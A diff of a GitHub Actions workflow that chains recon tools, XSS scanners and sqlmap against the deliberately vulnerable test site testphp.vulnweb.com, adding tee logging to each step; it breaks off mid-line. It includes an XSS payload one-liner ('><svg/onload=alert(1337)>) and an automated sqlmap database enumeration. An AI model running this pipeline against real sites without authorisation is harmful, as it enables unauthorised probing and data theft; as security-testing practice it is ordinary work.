@@ -41,22 +41,6 @@ jobs:
           go install github.com/hahwul/dalfox/v2@latest
           go install github.com/Emoe/kxss@latest
 
-          # Verify installation of tools
-          echo $PATH
-          which assetfinder || echo "assetfinder not found"
-          which subfinder || echo "subfinder not found"
-          which httprobe || echo "httprobe not found"
-          which waybackurls || echo "waybackurls not found"
-          which httpx || echo "httpx not found"
-          which gf || echo "gf not found"
-          which anew || echo "anew not found"
-          which fff || echo "fff not found"
-          which gospider || echo "gospider not found"
-          which nuclei || echo "nuclei not found"
-          which kxss || echo "kxss not found"
-          which dalfox || echo "dalfox not found"
-        shell: bash
-
       - name: Verify installation
         run: |
           echo $PATH
@@ -94,7 +78,6 @@ jobs:
           cat subdomain.txt | ~/go/bin/httprobe -c 50 > "${{ runner.temp }}/httprobe.out"
         shell: bash
 
-
       - name: Run waybackurls
         run: |
           echo testphp.vulnweb.com | ~/go/bin/waybackurls | sort -u > "${{ runner.temp }}/waybackurls.out"
@@ -117,43 +100,42 @@ jobs:
           export PATH=$PATH:$HOME/go/bin
 
           # Additional commands
-          cat subdomain.txt | ~/go/bin/anew "${{ runner.temp }}/domains"
-          cat "${{ runner.temp }}/domains" | ~/go/bin/httprobe -c 50 | ~/go/bin/anew "${{ runner.temp }}/hosth"
-          cat "${{ runner.temp }}/hosth" | ~/go/bin/fff -d 1 -S -o "${{ runner.temp }}/roots"
-          ~/go/bin/gf meg-headers < "${{ runner.temp }}/roots"
-          ~/go/bin/gf servers < "${{ runner.temp }}/roots" | ~/go/bin/anew "${{ runner.temp }}/gf-servers"
+          cat subdomain.txt | ~/go/bin/anew "${{ runner.temp }}/domains" | tee "${{ runner.temp }}/step_domains.txt"
+          cat subdomain.txt | ~/go/bin/httprobe -c 50 | ~/go/bin/anew "${{ runner.temp }}/hosth" | tee "${{ runner.temp }}/step_httprobe.txt"
+          cat "${{ runner.temp }}/hosth" | ~/go/bin/fff -d 1 -S -o "${{ runner.temp }}/roots" | tee "${{ runner.temp }}/step_fff.txt"
+          ~/go/bin/gf meg-headers < "${{ runner.temp }}/roots" | tee "${{ runner.temp }}/step_meg_headers.txt"
+          ~/go/bin/gf servers < "${{ runner.temp }}/roots" | ~/go/bin/anew "${{ runner.temp }}/gf-servers" | tee "${{ runner.temp }}/step_gf_servers.txt"
 
           # Run additional security scans
-          echo "assets.testphp.vulnweb.com" | ~/go/bin/waybackurls | ~/go/bin/httpx -silent | ~/go/bin/kxss -c 100 -p Xss | sort -u | ~/go/bin/dalfox pipe
+          echo "assets.testphp.vulnweb.com" | ~/go/bin/waybackurls | ~/go/bin/httpx -silent | ~/go/bin/kxss -c 100 -p Xss | sort -u | ~/go/bin/dalfox pipe | tee "${{ runner.temp }}/step_xss_scan.txt"
 
           # Simple Reflected XSS
-          ~/go/bin/subfinder -d testphp.vulnweb.com | ~/go/bin/httprobe -c 100 > "${{ runner.temp }}/target.txt"
-          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls | ~/go/bin/gf xss | ~/go/bin/kxss
+          cat subdomain.txt | ~/go/bin/httprobe -c 100 > "${{ runner.temp }}/target.txt" | tee "${{ runner.temp }}/step_target.txt"
+          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls | ~/go/bin/gf xss | ~/go/bin/kxss | tee "${{ runner.temp }}/step_reflected_xss.txt"
 
           # Wayback URL collecting
-          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls
+          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls | tee "${{ runner.temp }}/step_wayback_collecting.txt"
 
           # SQL Injection
-          ~/go/bin/subfinder -d testphp.vulnweb.com | tee -a "${{ runner.temp }}/domains"
-          cat "${{ runner.temp }}/domains" | ~/go/bin/httpx | tee -a "${{ runner.temp }}/alive.txt"
-          cat "${{ runner.temp }}/alive.txt" | ~/go/bin/waybackurls | tee -a "${{ runner.temp }}/urls"
-          ~/go/bin/gf sqli "${{ runner.temp }}/urls" >> "${{ runner.temp }}/sqli"
-          sqlmap -m "${{ runner.temp }}/sqli" --dbs --batch
+          cat subdomain.txt | tee -a "${{ runner.temp }}/domains" | tee "${{ runner.temp }}/step_sql_domains.txt"
+          cat "${{ runner.temp }}/domains" | ~/go/bin/httpx | tee -a "${{ runner.temp }}/alive.txt" | tee "${{ runner.temp }}/step_httpx_alive.txt"
+          cat "${{ runner.temp }}/alive.txt" | ~/go/bin/waybackurls | tee -a "${{ runner.temp }}/urls" | tee "${{ runner.temp }}/step_wayback_urls.txt"
+          ~/go/bin/gf sqli "${{ runner.temp }}/urls" >> "${{ runner.temp }}/sqli" | tee "${{ runner.temp }}/step_sqli.txt"
+          sqlmap -m "${{ runner.temp }}/sqli" --dbs --batch | tee "${{ runner.temp }}/step_sqlmap.txt"
 
           # SQL Injection One-liner
-          ~/go/bin/gau -subs testphp.vulnweb.com | cut -d / -f 3 | sort -u
+          ~/go/bin/gau -subs testphp.vulnweb.com | cut -d / -f 3 | sort -u | tee "${{ runner.temp }}/step_sql_injection_one_liner.txt"
 
           # Collect .js files
-          ~/go/bin/assetfinder testphp.vulnweb.com | ~/go/bin/waybackurls | grep -E "\\.js(?:onp?)?$" | ~/go/bin/anew
+          cat subdomain.txt | ~/go/bin/waybackurls | grep -E "\\.js(?:onp?)?$" | ~/go/bin/anew | tee "${{ runner.temp }}/step_js_files.txt"
 
           # Vulnerability detection
-          cat "${{ runner.temp }}/waybackurl" | grep "php?id="
-          cat "${{ runner.temp }}/waybackurl" | grep ".xlsx"
+          cat "${{ runner.temp }}/waybackurls.out" | grep "php?id=" | tee "${{ runner.temp }}/step_vuln_detection_php.txt"
+          cat "${{ runner.temp }}/waybackurls.out" | grep ".xlsx" | tee "${{ runner.temp }}/step_vuln_detection_xlsx.txt"
 
           # XSS one-liner
-          cat "${{ runner.temp }}/waybackurl" | grep '=' | ~/go/bin/qsreplace '"><svg/onload=alert(1337)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31mVulnerable"; done
+          cat "${{ runner.temp }}/waybackurls.out" | grep '=' | ~/go/bin/qsreplace '"><svg/onload=alert(1337)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31mVulnerable"; done | tee "${{ runner.temp }}/step_xss_one_liner.txt"
 
           # Collect JS files using gau
           ~/go/bin/gau -subs testphp.vulnweb.com | cut -d"?" -f1 | grep -E "\\.js(?:onp?)?$" | tee "${{ runner.temp }}/urls.txt"
-          sort -u "${{ runner.temp }}/urls.txt" | ~/go/bin/fff -o "${{ runner.temp }}/jsfiles"
-        shell: bash
+          sort -u "${
